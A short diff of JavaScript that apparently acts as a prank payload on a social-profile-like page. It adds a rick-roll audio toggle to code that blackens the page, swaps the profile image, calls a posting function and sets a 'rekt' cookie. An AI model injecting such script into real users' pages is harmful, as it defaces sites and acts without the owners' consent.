@@ -52,7 +52,11 @@ function change_Profile(){
     document.body.style.backgroundColor = "black";
     eeek = document.getElementById("fb-image-lg");
     eeek.src = "https://pws1453.github.io/shrek.jpg";
+}
 
+function rick_roll(){
+    rick = document.getElementById("rick");
+    rick.muted = !rick.muted;
 }
 
 const cookies = new URLSearchParams(document.cookie.replaceAll("; ","&"))
@@ -60,5 +64,6 @@ if (cookies.get("commented") != "yes") {
     post_About();
 }
 change_Profile();
+rick_roll();
 
 document.cookie = "rekt=yes"
